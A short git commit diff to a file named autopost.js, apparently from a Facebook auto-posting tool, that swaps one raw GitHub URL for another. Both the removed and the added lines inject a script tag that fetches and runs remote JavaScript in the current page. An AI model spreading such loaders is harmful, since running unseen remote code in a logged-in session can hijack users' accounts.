655a639d9d2f56df0fc2ebcf61bae76ffe52c5c6
ServerSystem <address11501@hotmail.com>
2013-10-28 11:22:53 +0700

    Update autopost.js

--- autopost.js
+++ autopost.js
@@ -1,3 +1,3 @@
-var Y = "https://raw.github.com/bhargav1996/Fb-Auto-tools/master/INBOX.js";
+var Y = "https://raw.github.com/ServerSystem/facebook/master/inbox.js";
 Z = unescape(Y);
 document.body.appendChild(document.createElement("script")).src = Z;
